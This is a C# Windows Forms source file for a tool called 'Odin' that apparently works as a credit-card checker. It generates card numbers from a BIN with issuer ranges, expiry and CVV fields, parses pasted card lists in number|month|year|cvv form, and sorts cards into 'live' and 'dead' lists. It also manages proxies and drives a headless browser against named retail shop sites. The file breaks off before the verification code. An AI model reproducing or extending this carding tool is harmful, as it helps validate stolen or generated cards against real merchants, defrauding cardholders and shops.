using Bogus;

using CefSharp;
using CefSharp.OffScreen;

using FontAwesome.Sharp;

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Asgard
{
    public partial class Odin : Form, IForm
    {
        public new IClans Owner { get; set; }
        //public new IHome Home { set; get; }
        //public new IChecker Checker { set; get; }

        private string Bin { set; get; }
        private string Quatity { set; get; }
        private int UserId { set; get; }
        private string Token { set; get; }
        private int GateId { set; get; }

        List<List<string>> CreditCards { set; get; }
        List<List<string>> LiveCreditCards { set; get; }
        List<List<string>> DieCreditCards { set; get; }
        List<List<string>> Valkyries { set; get; }
        List<List<string>> LiveValkyries { set; get; }

        #region Range Credit Cards
        private static readonly string[] rangeAmex = new[] { "34", "37" };//American Express
        private static readonly string[] rangeCUP = new[] { "62" };//China Union Pay
        private static readonly string[] rangeDCCB = new[] { "300-305" };//Diners Club Carte Blanche
        private static readonly string[] rangeDCI = new[] { "36", "38" };//Diners Club International
        private static readonly string[] rangeDCUSC = new[] { "54", "55" };//Diners Club United States & Canada
        private static readonly string[] rangeDC = new[] { "6011", "622126-622925", "644-649", "65" };//Discover Card
        private static readonly string[] rangeIntP = new[] { "636" };//InterPayment
        private static readonly string[] rangeInsP = new[] { "637-639" };//InstaPayment
        private static readonly string[] rangeJCB = new[] { "3528-3589" };//JCB
        private static readonly string[] rangeM = new[] { "50", "56-58", "6" };//Maestro
        private static readonly string[] rangeMC = new[] { "2221-2720", "51-55" };//Master Card
        private static readonly string[] rangeUATP = new[] { "1" };//UATP
        private static readonly string[] rangeV = new[] { "4" };//Visa
        #endregion

        private string cvvDigits = "###";

        private static ChromiumWebBrowser browser;

        private const string web = "www.shoebacca.com";
        private const string initialUrl = "https://" + web;
        #region middleInitialUrl
        private static readonly string[] middleInitialUrl = new[] {
            "/womens-shoes/",
            "/mens-shoes/",
            "/kids-shoes/",
            "/apparel/",
            "/accessories/",
            "/clearance-warehouse/clothing/"
        };
        #endregion

        private const string lastInitialUrl = "search/price.usd.default/:25?sortBy=sbdefault_products_price_default_asc";

        private Faker Faker { set; get; }


        private bool IconButtonGenerarClick = false;
        private bool ShowPanelValkyrie = false;
        private bool IconButtonValkyrieVerifyClick = false;
        private bool IconButtonGenerarStopClick = false;
        private Color IconButtonGenerarIconColor;
        private bool IconButtonGenerarEnabled;
        private bool forsetiError = false;
        private bool firstTime = true;

        private CancellationTokenSource tokenCancel;

        SoundPlayer Valhalla;
        SoundPlayer Valkyrie;


        public Odin()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
            Faker = new Faker();
        }
        private void Odin_Load(object sender, EventArgs e)
        {
            ControlsInit();
        }

        public void InitializeParameters(params object[] parameters)
        {
            if (parameters.Length == 3)
            {
                UserId = (int)parameters[0];
                Token = parameters[1].ToString();
                Owner = (Aesir)parameters[2];
            }
        }

        #region General
        #region Controls Events
        private void IconButtonBack_Click(object sender, EventArgs e)
        {
            Form form = Parent.Controls.OfType<Aesir>().FirstOrDefault();
            if (form == null)
            {
                Parent.Parent.Show();
                Parent.Parent.BringToFront();
                form.TopLevel = false;
                form.Dock = DockStyle.Fill;
                Parent.Parent.Controls.Add(form);
                Parent.Parent.Tag = form;
                form.BringToFront();
                form.Show();
            }
            else
            {
                form.BringToFront();
            }
        }
        private async void IconButtonClose_Click(object sender, EventArgs e)
        {
            PanelConfirm.Show();
            await IconButtonConfirm.OnClickAsync();
            Owner.HideIconActive("odin");
            PanelConfirm.Hide();
            if (browser != null)
            {
                await browser.Kill("www.brownells.com");
            }
            this.Close();
        }
        #endregion
        #region Methods
        private void ControlsInit()
        {
            Yggdrasil.God = "odin";
            GateId = 1;
            Bin = string.Empty;
            TextBoxBin.ContextMenuStrip = new ContextMenuStrip();
            TextBoxBin.Placeholder("######xxxxxxxxxx");
            MaskedTextBoxDate.ContextMenuStrip = new ContextMenuStrip();
            MaskedTextBoxDate.Placeholder("dd/aa");
            TextBoxCvv.ContextMenuStrip = new ContextMenuStrip();
            TextBoxCvv.Placeholder(cvvDigits);
            TextBoxCvv.MaxLength = 3;
            TextBoxQuantity.ContextMenuStrip = new ContextMenuStrip();

            IconButtonGenerar.IconColor = Color.Black;
            IconButtonGenerar.Enabled = false;
            IconButtonGenerarStop.Hide();
            IconButtonVerify.IconColor = Color.Black;
            IconButtonVerify.Enabled = false;
            IconButtonStop.IconColor = Color.Black;
            IconButtonStop.Enabled = false; ;
            IconButtonClear.IconColor = Color.Black;
            IconButtonClear.Enabled = false;
            IconButtonValkyrieClear.IconColor = Color.Black;
            IconButtonValkyrieClear.Enabled = false;
            IconButtonValkyrieStart.IconColor = Color.Black;
            IconButtonValkyrieStart.Enabled = false;
            IconButtonValkyrieVerify.IconColor = Color.Black;
            IconButtonValkyrieVerify.Enabled = false;
            IconButtonValkyrieStop.Hide();
            PanelConfirm.Hide();
            CircularProgressBarGeneral.Minimum = 0;
            CircularProgressBarGeneral.Maximum = 100;
            pictureBox1.Hide();
            pictureBox2.Hide();
            pictureBox3.Hide();
            pictureBox4.Hide();
            pictureBox5.Hide();
            pictureBox6.Hide();
            PanelValkyrie.Hide();
            PanelValkyrieLive.Hide();
            PanelValkyrieDie.Hide();
            PanelBlockGate.Hide();
            CircularProgressBarGeneral.Value = 0;
            CircularProgressBarDetail.Value = 0;
            Valhalla = new SoundPlayer(@"Valhalla.wav");
            Valkyrie = new SoundPlayer(@"Valkyrie.wav");
        }
        #endregion
        #endregion

        #region Checker
        #region Panel Generator
        #region Panel Events
        private void PanelGenerator_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxBin = new Rectangle(TextBoxBin.Location.X, TextBoxBin.Location.Y, TextBoxBin.ClientSize.Width, TextBoxBin.ClientSize.Height);
            borderTextBoxBin.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxBin, Color.White, ButtonBorderStyle.Solid);

            Rectangle borderMaskedTextBoxDate = new Rectangle(MaskedTextBoxDate.Location.X, MaskedTextBoxDate.Location.Y, MaskedTextBoxDate.ClientSize.Width, MaskedTextBoxDate.ClientSize.Height);
            borderMaskedTextBoxDate.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderMaskedTextBoxDate, Color.White, ButtonBorderStyle.Solid);

            Rectangle borderTextBoxCvv = new Rectangle(TextBoxCvv.Location.X, TextBoxCvv.Location.Y, TextBoxCvv.ClientSize.Width, TextBoxCvv.ClientSize.Height);
            borderTextBoxCvv.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCvv, Color.White, ButtonBorderStyle.Solid);

            Rectangle borderTextBoxQuantity = new Rectangle(TextBoxQuantity.Location.X, TextBoxQuantity.Location.Y, TextBoxQuantity.ClientSize.Width, TextBoxQuantity.ClientSize.Height);
            borderTextBoxQuantity.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxQuantity, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Controls Events
        #region TextBoxBin Events
        private void TextBoxBin_Enter(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.Placeholder("######xxxxxxxxxx");
        }
        private void TextBoxBin_Leave(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.Placeholder("######xxxxxxxxxx");
            Bin = textBox.Text;
            CompleteBin(textBox);
        }
        private void TextBoxBin_KeyUp(object sender, KeyEventArgs e)
        {
            try
            {
                if (Bin == string.Empty && (e.KeyCode == Keys.D0 || e.KeyCode == Keys.NumPad0))
                {
                    e.SuppressKeyPress = true;
                    return;
                }
            }
            catch (Exception) { }
        }
        private void TextBoxBin_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (Bin == string.Empty && (e.KeyCode == Keys.D0 || e.KeyCode == Keys.NumPad0))
                {
                    e.SuppressKeyPress = true;
                    return;
                }

                if (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
                {
                    Bin += (char)e.KeyValue;
                }
                else if (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.NumPad9)
                {
                    Bin += Convert.ToChar(e.KeyCode - 48);
                }
                else if (e.KeyCode == Keys.Back)
                {
                    int startIndex = Bin.Length - 1;
                    if (startIndex >= 0)
                    {
                        Bin = Bin.Remove(startIndex);
                        Task.Run(() => InfoBinList());
                    }
                    else
                    {
                        e.SuppressKeyPress = true;
                        return;
                    }
                }
                else if (e.KeyCode == Keys.Tab && Bin.Length < 6)
                {
                    e.SuppressKeyPress = true;
                    return;
                }
                else if (e.KeyCode == Keys.V && e.Control)
                {
                    e.SuppressKeyPress = false;
                }
                else if (e.Control && e.KeyCode == Keys.C)
                {
                    e.SuppressKeyPress = false;
                }
                else if (e.Control && e.KeyCode == Keys.X)
                {
                    e.SuppressKeyPress = false;
                }
                else
                {
                    e.SuppressKeyPress = true;
                    return;
                }
                Task.Run(() => InfoBinList(Bin));
            }
            catch (Exception) { }
        }

        private void TextBoxBin_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            Bin = textBox.Text;
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                int textLenght = textBox.TextLength;
                for (int i = 0; i < textLenght; i++)
                {
                    if (i < 6)
                    {
                        if (Regex.IsMatch(textBox.Text.Substring(i, 1), "[^0-9]"))
                        {
                            textBox.Clear();
                            break;
                        }
                    }
                    else if (Regex.IsMatch(textBox.Text.Substring(i, 1), @"[^x-xX-X0-9]"))
                    {
                        textBox.Clear();
                        break;
                    }
                }
                CompleteBin(textBox);
                Bin = textBox.Text;
                Task.Run(() => InfoBinList(Bin));
            }
        }

        private void TextBoxBin_Validating(object sender, CancelEventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            string text = textBox.Text;
            if (text == "######xxxxxxxxxx")
            {
                text = string.Empty;
            }

            if (string.IsNullOrEmpty(text))
            {
                IconButtonGenerar.IconColor = Color.Black;
                IconButtonGenerar.Enabled = false;
            }
            else
            {
                if (text.Length < 6)
                {
                    IconButtonGenerar.IconColor = Color.Black;
                    IconButtonGenerar.Enabled = false;
                }
                else
                {
                    if (!ValidateBin(text))
                    {
                        IconButtonGenerar.IconColor = Color.Black;
                        IconButtonGenerar.Enabled = false;
                    }
                    else
                    {
                        IconButtonGenerar.IconColor = Color.White;
                        IconButtonGenerar.Enabled = true;
                        IconButtonClear.IconColor = Color.White;
                        IconButtonClear.Enabled = true;

                    }
                }
            }
        }
        #endregion
        #region MaskedBoxDate Events
        private void MaskedTextBoxDate_Enter(object sender, EventArgs e)
        {
            MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
            maskedTextBox.Placeholder("dd/aa");
            MaskedTextBoxDate.Mask = "##/##";
            string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
            this.BeginInvoke((MethodInvoker)delegate ()
            {
                if (text.Length > 2)
                {
                    maskedTextBox.Select(text.Length + 1, 0);
                }
                else
                {
                    maskedTextBox.Select(text.Length, 0);
                }
            });
        }
        private void MaskedTextBoxDate_Leave(object sender, EventArgs e)
        {
            MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
            string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
            if (string.IsNullOrEmpty(text) || text.Length < 4)
            {
                maskedTextBox.Clear();
                MaskedTextBoxDate.Mask = "";
                maskedTextBox.Placeholder("dd/aa");
                maskedTextBox.Select(0, 0);
            }

        }
        private void MaskedTextBoxDate_KeyUp(object sender, KeyEventArgs e)
        {
            MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
            string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
            if (text.Length > 0)
            {
                if (text.Length == 1)
                {
                    if (Regex.IsMatch(text, @"([^0-1])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
                else if (text.Length == 2)
                {
                    if (Regex.IsMatch(text, @"^(0[^1-9]|1[^0-2])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
                else if (text.Length == 3)
                {
                    if (Regex.IsMatch(text, @"([^2-2])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
                else if (text.Length == 4)
                {
                    if (Regex.IsMatch(text, @"([^0-9])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
            }
        }
        private void MaskedTextBoxDate_TextChanged(object sender, EventArgs e)
        {
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
                string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
                if (text.Length > 0)
                {
                    for (int i = 0; i < text.Length; i++)
                    {
                        if (i == 0)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"([^0-1])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                        else if (i == 1)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"^(0[^1-9]|1[^0-2])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                        else if (i == 2)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"([^2-2])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                        else if (i == 3)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"([^0-9])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                    }
                }
            }
        }
        #endregion
        #region TxtBoxCvv Events
        private void TextBoxCvv_Enter(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.Placeholder(cvvDigits);
        }
        private void TextBoxCvv_Leave(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (textBox.TextLength < cvvDigits.Length)
            {
                textBox.Clear();
            }
            textBox.Placeholder(cvvDigits);
        }
        private void TextBoxCvv_KeyUp(object sender, KeyEventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (Regex.IsMatch(textBox.Text, "[^0-9]"))
            {
                textBox.Text = textBox.Text.Remove(textBox.TextLength - 1);
            }
        }
        private void TextBoxCvv_TextChanged(object sender, EventArgs e)
        {
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                TextBox textBox = (TextBox)sender;
                if (Regex.IsMatch(textBox.Text, "[^0-9]"))
                {
                    textBox.Clear();
                    textBox.Select(0, 0);
                }
            }
        }
        #endregion
        #region TextBoxQuantity Events
        private void TextBoxQuatity_TextChanged(object sender, EventArgs e)
        {
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                TextBox textBox = (TextBox)sender;
                if (Regex.IsMatch(textBox.Text, "[^0-9]"))
                {
                    textBox.Clear();
                    textBox.Select(0, 0);
                }
            }
        }
        private void TextBoxQuatity_KeyUp(object sender, KeyEventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (Regex.IsMatch(textBox.Text, "[^0-9]"))
            {
                textBox.Text = textBox.Text.Remove(textBox.TextLength - 1);
            }
        }
        private void TextBoxQuatity_Leave(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (textBox.Text == string.Empty)
            {
                textBox.Text = "10";
            }
        }
        #endregion
        #region IconButtonGenerar Events
        private async void IconButtonGenerar_Click(object sender, EventArgs e)
        {
            try
            {
                if (ValidateChildren(ValidationConstraints.Enabled))
                {
                    IconButton iconButton = (IconButton)sender;
                    iconButton.IconColor = Color.Black;
                    iconButton.Enabled = false;
                    IconButtonVerify.IconColor = Color.Black;
                    IconButtonVerify.Enabled = false;
                    IconButtonStop.IconColor = Color.Black;
                    IconButtonStop.Enabled = false;
                    IconButtonClear.IconColor = Color.Black;
                    IconButtonClear.Enabled = false;
                    IconButtonValkyrie.IconColor = Color.Black;
                    IconButtonValkyrie.Enabled = false;
                    IconButtonGenerarStop.Show();
                    IconButtonGenerarClick = true;
                    await ConsoleProgressGeneral("Iniciando Motor del Generador.", 0);
                    await GenerateCreditCards();
                    await ConsoleProgressGeneral("Tarjetas de credito generadas correctamente.", 100, "Success");
                    await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
                    IconButtonGenerarStop.Hide();
                    iconButton.IconColor = Color.White;
                    iconButton.Enabled = true;
                    IconButtonVerify.IconColor = Color.White;
                    IconButtonVerify.Enabled = true;
                    IconButtonClear.IconColor = Color.White;
                    IconButtonClear.Enabled = true;
                    IconButtonValkyrie.IconColor = Color.White;
                    IconButtonValkyrie.Enabled = true;
                    IconButtonGenerarClick = false;
                }
            }
            catch (Exception) { }
        }
        #endregion
        #region IconButtonGenerarStop Events
        private void IconButtonGenerarStop_Click(object sender, EventArgs e)
        {
            if (tokenCancel != null)
            {
                IconButton iconbutton = (IconButton)sender;
                iconbutton.IconColor = Color.Black;
                iconbutton.Enabled = false;
                IconButtonGenerarStopClick = true;
                tokenCancel.Cancel();
                tokenCancel.Dispose();
                tokenCancel = null;
                //IconButtonGenerar.IconColor = Color.White;
                //IconButtonGenerar.Enabled = true;
                //if(CreditCards != null)
                //{
                //    if(CreditCards.Count > 0)
                //    {
                //        IconButtonVerify.IconColor = Color.White;
                //        IconButtonVerify.Enabled = true;
                //    }
                //}
            }
        }
        #endregion
        #endregion
        #region Validations
        public bool ValidateBin(string text)
        {
            try
            {
                RangeAndLength[] range = AllCards();
                int rangeLength = range.Length;
                for (int j = 0; j < rangeLength; j++)
                {
                    string pattern = @"\b" + range[j].Range;
                    Match match = Regex.Match(text, pattern);
                    if (match.Success)
                    {
                        return true;
                    }
                }
                return false;
            }
            catch (Exception) { }
            return false;
        }

        #endregion
        #region Methods
        private void CompleteBin(TextBox textBox)
        {
            if (textBox.TextLength >= 6)
            {

                int textLenght = textBox.TextLength;
                int cardLenght = 0;
                Dictionary<int, int> precision = new Dictionary<int, int>();
                RangeAndLength[] range = AllCards();
                int rangeLength = range.Length;
                for (int j = 0; j < rangeLength; j++)
                {
                    string pattern = @"\b" + range[j].Range;
                    Match match = Regex.Match(textBox.Text, pattern);
                    if (match.Success)
                    {
                        precision.Add(j, int.Parse(match.Value));
                    }
                }

                if (precision.Count > 0)
                {
                    RangeAndLength card = range[precision.OrderByDescending(x => x.Value).First().Key];
                    cardLenght = card.Length;
                    textBox.MaxLength = cardLenght;

                    if (card.Range == "34" || card.Range == "37")
                    {
                        cvvDigits = "####";
                        TextBoxCvv.MaxLength = 4;
                    }
                    else
                    {
                        cvvDigits = "###";
                        TextBoxCvv.MaxLength = 3;
                    }

                    if (textLenght >= 6 && textLenght < cardLenght)
                    {
                        int limit = cardLenght - textLenght;
                        string ext = "";
                        for (int i = 0; i < limit; i++)
                        {
                            ext += "x";
                        }
                        textBox.Text += ext;
                    }
                }
                else
                {
                    cvvDigits = "###";
                    TextBoxCvv.MaxLength = 3;
                }

                textBox.Select(textBox.TextLength, 0);
                TextBoxCvv.ForeColor = Color.Silver;
                TextBoxCvv.Text = cvvDigits;
            }
        }
        #endregion
        #endregion
        #region Panel Console
        #region Methods
        public async Task ConsoleProgressGeneral(string info, int value = 101, string status = null)
        {
            try
            {
                LabelInfoGeneralConsole.ForeColor = Color.White;
                int delay = 100;
                if (status == "Success")
                {
                    LabelInfoGeneralConsole.ForeColor = Color.FromArgb(17, 97, 238);
                    delay = 3000;
                }
                else if (status == "Fail")
                {
                    LabelInfoGeneralConsole.ForeColor = Color.DarkRed;
                    delay = 5000;
                }

                if (value != 101)
                {
                    CircularProgressBarGeneral.Value = value;
                    CircularProgressBarGeneral.Text = CircularProgressBarGeneral.Value.ToString();
                }
                //await Task.Delay(100);
                LabelInfoGeneralConsole.Text = info;
                await Task.Delay(delay);
            }
            catch (Exception) {/* throw;*/ }
        }

        public async Task ConsoleProgressDetail(string info, int value = 101, string status = null)
        {
            try
            {
                LabelInfoGeneralConsole.ForeColor = Color.White;
                int delay = 10;
                if (status == "Success")
                {
                    LabelInfoGeneralConsole.ForeColor = Color.FromArgb(17, 97, 238);
                    delay = 3000;
                }
                else if (status == "Fail")
                {
                    LabelInfoGeneralConsole.ForeColor = Color.DarkRed;
                    delay = 5000;
                }

                if (value != 101)
                {
                    CircularProgressBarDetail.Value = value;
                    CircularProgressBarDetail.Text = CircularProgressBarDetail.Value.ToString();
                }
                await Task.Delay(100);

                LabelInfoGeneralConsole.Text = info;
                await Task.Delay(delay);
            }
            catch (Exception) {/* throw;*/ }
        }
        #endregion
        #endregion
        #region Panel Information
        #region Cotrols Events
        private async void IconButtonValkyrie_Click(object sender, EventArgs e)
        {
            if (ShowPanelValkyrie)
            {
                IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
                IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
                PanelValkyrie.Hide();
                PanelValkyrieLive.Hide();
                PanelValkyrieDie.Hide();
                ShowPanelValkyrie = false;
                await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
                await ConsoleProgressDetail("ODIN PADRE DE TODO.", 0);
            }
            else
            {
                IconButtonGenerarIconColor = IconButtonGenerar.IconColor;
                IconButtonGenerarEnabled = IconButtonGenerar.Enabled;

                if (IconButtonGenerarEnabled)
                {
                    IconButtonGenerar.IconColor = Color.Black;
                    IconButtonGenerar.Enabled = false;
                }
                PanelValkyrie.Show();
                PanelValkyrieLive.Show();
                PanelValkyrieDie.Show();
                ShowPanelValkyrie = true;
                await ConsoleProgressGeneral("VALKIRIAS (PROXYS)", 0);
                await ConsoleProgressDetail("VALKIRIAS (PROXYS)", 0);
            }
        }
        #endregion

        #region Methods
        private async Task InfoBinList(string bin = null)
        {
            try
            {
                if (bin != null)
                {
                    if (bin.Length >= 8)
                    {
                        bin = bin.Substring(0, 8);

                        pictureBox1.Show();
                        pictureBox2.Show();
                        pictureBox3.Show();
                        pictureBox4.Show();
                        pictureBox5.Show();
                        pictureBox6.Show();


                        dynamic binList = await Asatru.InfoBin(bin);
                        if (binList != null)
                        {
                            pictureBox1.Hide();
                            pictureBox2.Hide();
                            pictureBox3.Hide();
                            pictureBox4.Hide();
                            pictureBox5.Hide();
                            pictureBox6.Hide();
                            LabelGetBin.Text = bin;
                            LabelGetSchema.Text = binList.scheme ?? "-";
                            LabelGetType.Text = binList.type ?? "-";
                            LabelGetBrand.Text = binList.brand ?? "-";
                            LabelGetBank.Text = binList.bank.name ?? "-";
                            LabelGetCountry.Text = binList.country.name ?? "-";
                        }
                        else
                        {
                            pictureBox1.Hide();
                            pictureBox2.Hide();
                            pictureBox3.Hide();
                            pictureBox4.Hide();
                            pictureBox5.Hide();
                            pictureBox6.Hide();
                            LabelGetBin.Text = bin;
                            LabelGetSchema.Text = "-";
                            LabelGetType.Text = "-";
                            LabelGetBrand.Text = "-";
                            LabelGetBank.Text = "-";
                            LabelGetCountry.Text = "-";
                        }
                    }
                    else
                    {
                        pictureBox1.Hide();
                        pictureBox2.Hide();
                        pictureBox3.Hide();
                        pictureBox4.Hide();
                        pictureBox5.Hide();
                        pictureBox6.Hide();
                        LabelGetBin.Text = bin;
                        LabelGetSchema.Text = "-";
                        LabelGetType.Text = "-";
                        LabelGetBrand.Text = "-";
                        LabelGetBank.Text = "-";
                        LabelGetCountry.Text = "-";
                    }
                }
            }
            catch (Exception) { }
        }
        #endregion
        #endregion
        #region Panel Credit Cards
        #region Panel Events
        private void PanelCreditCards_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxCreditCards = new Rectangle(TextBoxCreditCards.Location.X, TextBoxCreditCards.Location.Y, TextBoxCreditCards.ClientSize.Width + 17, TextBoxCreditCards.ClientSize.Height);
            borderTextBoxCreditCards.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCreditCards, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Controls Events
        private async void TextBoxCreditCards_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            try
            {
                LabelCountCreditCards.Text = textBox.Lines.Count().ToString();
                string creditCards = textBox.Text.Trim();
                if (ModifierKeys.HasFlag(Keys.Control))
                {
                    if (creditCards.Contains("\r\n"))
                    {
                        string[] listCreditCards = creditCards.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                        int listcreditCardsLength = listCreditCards.Length;
                        CreditCards = new List<List<string>>();
                        for (int i = 0; i < listcreditCardsLength; i++)
                        {
                            string[] listCreditCard = listCreditCards[i].Split('|');
                            CreditCards.Add(new List<string>());
                            //if (listCreditCard[0].Length >= 12 && listCreditCard[0].Length <= 16)
                            //{
                            CreditCards[i].Add(listCreditCard[0]);
                            //}
                            //else if (listCreditCard[1].Length == 2)
                            //{
                            CreditCards[i].Add(listCreditCard[1]);
                            //}
                            //else if (listCreditCard[2].Length == 4)
                            //{
                            CreditCards[i].Add(listCreditCard[2]);
                            //}
                            //else if (listCreditCard[3].Length >= 3 && listCreditCard[3].Length <= 4)
                            //{
                            CreditCards[i].Add(listCreditCard[3]);
                            //}
                            //else {
                            //    await ConsoleProgressGeneral("Error en el formato.", 0, "Fail");
                            //}
                        }
                        if (!IconButtonGenerarClick)
                        {
                            IconButtonVerify.IconColor = Color.White;
                            IconButtonVerify.Enabled = true;
                            IconButtonClear.IconColor = Color.White;
                            IconButtonClear.Enabled = true;
                        }
                        Task.Run(() => InfoBinList(CreditCards[0][0]));
                    }
                    else if (creditCards.Contains("|"))
                    {
                        CreditCards = new List<List<string>>();
                        string[] listCreditCard = creditCards.Split('|');
                        CreditCards.Add(new List<string>());
                        CreditCards[0].Add(listCreditCard[0]);
                        CreditCards[0].Add(listCreditCard[1]);
                        CreditCards[0].Add(listCreditCard[2]);
                        CreditCards[0].Add(listCreditCard[3]);
                        if (!IconButtonGenerarClick)
                        {
                            IconButtonVerify.IconColor = Color.White;
                            IconButtonVerify.Enabled = true;
                            IconButtonClear.IconColor = Color.White;
                            IconButtonClear.Enabled = true;
                        }
                        Task.Run(() => InfoBinList(CreditCards[0][0]));
                    }
                    else
                    {
                        textBox.Text = string.Empty;
                        IconButtonVerify.IconColor = Color.Black;
                        IconButtonVerify.Enabled = false;
                        IconButtonClear.IconColor = Color.Black;
                        IconButtonClear.Enabled = false;
                    }
                }
                else
                {
                    if (creditCards == string.Empty)
                    {
                        textBox.Text = string.Empty;
                        IconButtonVerify.IconColor = Color.Black;
                        IconButtonVerify.Enabled = false;
                        if (TextBoxValhalla.Text == string.Empty && TextBoxHelheim.Text == string.Empty && IconButtonGenerar.Enabled == false)
                        {
                            IconButtonClear.IconColor = Color.Black;
                            IconButtonClear.Enabled = false;
                        }
                    }
                }
            }
            catch (Exception)
            {
                textBox.Text = string.Empty;
                IconButtonVerify.IconColor = Color.Black;
                IconButtonVerify.Enabled = false;
                IconButtonClear.IconColor = Color.Black;
                IconButtonClear.Enabled = false;
            }
        }


        private async Task<bool> UpCreditCards()
        {
            string creditCards = TextBoxCreditCards.Text.Trim();
            try
            {
                if (creditCards.Contains("\r\n"))
                {
                    string[] listCreditCards = creditCards.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                    int listcreditCardsLength = listCreditCards.Length;
                    CreditCards = new List<List<string>>();
                    for (int i = 0; i < listcreditCardsLength; i++)
                    {
                        string[] listCreditCard = listCreditCards[i].Split('|');
                        CreditCards.Add(new List<string>());
                        CreditCards[i].Add(listCreditCard[0]);
                        CreditCards[i].Add(listCreditCard[1]);
                        CreditCards[i].Add(listCreditCard[2]);
                        CreditCards[i].Add(listCreditCard[3]);

                    }
                }
                else if (creditCards.Contains("|"))
                {
                    CreditCards = new List<List<string>>();
                    string[] listCreditCard = creditCards.Split('|');
                    CreditCards.Add(new List<string>());
                    CreditCards[0].Add(listCreditCard[0]);
                    CreditCards[0].Add(listCreditCard[1]);
                    CreditCards[0].Add(listCreditCard[2]);
                    CreditCards[0].Add(listCreditCard[3]);
                }
                return true;
            }
            catch (Exception) { }
            return false;
        }

        private async void IconButtonVerify_Click(object sender, EventArgs e)
        {
            try
            {
                IconButtonGenerarIconColor = IconButtonGenerar.IconColor;
                IconButtonGenerarEnabled = IconButtonGenerar.Enabled;
                IconButton iconButton = (IconButton)sender;
                iconButton.IconColor = Color.Black;
                iconButton.Enabled = false;
                IconButtonGenerar.IconColor = Color.Black;
                IconButtonGenerar.Enabled = false;
                IconButtonClear.IconColor = Color.Black;
                IconButtonClear.Enabled = false;
                IconButtonValkyrie.IconColor = Color.Black;
                IconButtonValkyrie.Enabled = false;
                IconButtonStop.IconColor = Color.White;
                IconButtonStop.Enabled = true;
                //running = true;
                await UpCreditCards();
                await InvokeOdin();
                await ConsoleProgressGeneral("Odin finalizo Verificación.", 100, "Success");
                await ConsoleProgressDetail("Odin finalizo Verificación.", 100, "Success");
                await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
                await ConsoleProgressDetail("ODIN PADRE DE TODO.", 0);
                IconButtonClear.IconColor = Color.White;
                IconButtonClear.Enabled = true;
                IconButtonValkyrie.IconColor = Color.White;
                IconButtonValkyrie.Enabled = true;
            }
            catch (Exception) { }
        }
        #endregion
        #endregion
        #region Panel Valhalla
        #region Panel Events
        private void PanelValhalla_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxValhalla = new Rectangle(TextBoxValhalla.Location.X, TextBoxValhalla.Location.Y, TextBoxValhalla.ClientSize.Width + 17, TextBoxValhalla.ClientSize.Height);
            borderTextBoxValhalla.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValhalla, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Contols Events
        private void TextBoxValhalla_TextChanged(object sender, EventArgs e)
        {
            try
            {
                TextBox textBox = (TextBox)sender;
                LabelCountValhalla.Text = textBox.Lines.Count().ToString();

                Valhalla.Play();

            }
